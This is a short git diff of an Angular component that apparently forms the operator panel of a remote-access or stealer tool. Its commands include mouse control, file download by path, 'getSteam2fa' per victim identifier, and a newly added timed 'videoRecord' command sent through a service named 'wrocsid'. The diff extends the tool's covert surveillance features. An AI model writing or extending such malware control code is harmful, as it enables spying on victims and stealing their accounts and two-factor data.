@@ -13,6 +13,7 @@ export class CommandsComponent implements OnInit {
   mouseForm!: FormGroup
   recordForm!: FormGroup
   downloadForm!: FormGroup
+  videoRecordForm!: FormGroup
   disabled: boolean = true
   path: string = ""
 
@@ -33,6 +34,11 @@ export class CommandsComponent implements OnInit {
 
     this.downloadForm = this.fb.group({
       path: ['', [Validators.required, Validators.minLength(6)]],
+    })
+
+    this.videoRecordForm = this.fb.group({
+      timeAmount: ['', [Validators.required, Validators.min(1), this.timeControlValidation]],
+      timeUnits: ['s']
     })
   }
 
@@ -94,6 +100,9 @@ export class CommandsComponent implements OnInit {
         break;
       case 'getSteam2fa':
         this.wrocsid.getSteam2fa(identifier)
+        break;
+      case 'videoRecord':
+        this.wrocsid.videoRecord(identifier, args)
         break;
     }
   }
